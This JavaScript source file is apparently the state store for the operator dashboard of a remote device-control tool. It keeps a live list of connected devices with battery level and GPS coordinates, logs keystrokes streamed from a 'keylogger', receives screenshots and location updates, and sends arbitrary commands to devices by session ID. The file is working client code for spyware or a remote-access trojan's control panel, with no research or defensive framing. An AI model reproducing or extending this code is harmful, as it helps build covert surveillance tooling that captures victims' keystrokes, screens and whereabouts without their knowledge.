import { create } from 'zustand';
import { io } from 'socket.io-client';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000';

export const useDeviceStore = create((set, get) => ({
  // State
  devices: [],
  selectedDevice: null,
  stats: null,
  socket: null,
  isConnected: false,
  user: null,
  authToken: localStorage.getItem('authToken'),
  
  // Socket connection
  initSocket: () => {
    const { authToken } = get();
    const socket = io(API_URL, {
      auth: authToken ? { token: authToken } : {},
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: 10,
    });

    socket.on('connect', () => {
      set({ isConnected: true });
      console.log('✅ Socket connected');
    });

    socket.on('disconnect', () => {
      set({ isConnected: false });
      console.log('❌ Socket disconnected');
    });

    socket.on('device:registered', (device) => {
      set((state) => ({
        devices: [device, ...state.devices.filter(d => d.sessionId !== device.sessionId)],
      }));
    });

    socket.on('device:disconnected', ({ sessionId }) => {
      set((state) => ({
        devices: state.devices.map(d => 
          d.sessionId === sessionId ? { ...d, isOnline: false } : d
        ),
      }));
    });

    socket.on('device:heartbeat', ({ sessionId, batteryLevel, isCharging, latitude, longitude }) => {
      set((state) => ({
        devices: state.devices.map(d => 
          d.sessionId === sessionId 
            ? { ...d, batteryLevel, isCharging, latitude, longitude, isOnline: true } 
            : d
        ),
      }));
    });

    socket.on('keylogger:received', ({ sessionId, keystroke, timestamp }) => {
      // Handle real-time keylogger updates
      console.log(`Key from ${sessionId}: ${keystroke}`);
    });

    socket.on('screenshot:received', ({ sessionId, imageUrl }) => {
      // Handle screenshot notification
      console.log(`Screenshot from ${sessionId}`);
    });

    socket.on('location:update', ({ sessionId, latitude, longitude }) => {
      set((state) => ({
        devices: state.devices.map(d => 
          d.sessionId === sessionId ? { ...d, latitude, longitude } : d
        ),
      }));
    });

    set({ socket });
  },

  // Device actions
  setDevices: (devices) => set({ devices }),
  selectDevice: (device) => set({ selectedDevice: device }),
  clearSelectedDevice: () => set({ selectedDevice: null }),

  // Stats
  setStats: (stats) => set({ stats }),

  // User
  setUser: (user) => {
    set({ user });
    if (user) {
      localStorage.setItem('user', JSON.stringify(user));
    } else {
      localStorage.removeItem('user');
    }
  },

  setAuthToken: (token) => {
    set({ authToken: token });
    if (token) {
      localStorage.setItem('authToken', token);
    } else {
      localStorage.removeItem('authToken');
    }
  },

  logout: () => {
    const { socket } = get();
    if (socket) {
      socket.disconnect();
    }
    set({ user: null, authToken: null, devices: [], selectedDevice: null, stats: null });
    localStorage.removeItem('authToken');
    localStorage.removeItem('user');
  },

  // Commands
  sendCommand: async (sessionId, command, payload = {}) => {
    const { socket } = get();
    if (socket && socket.connected) {
      socket.emit(`command:${command}`, { sessionId, ...payload });
    }
  },
}));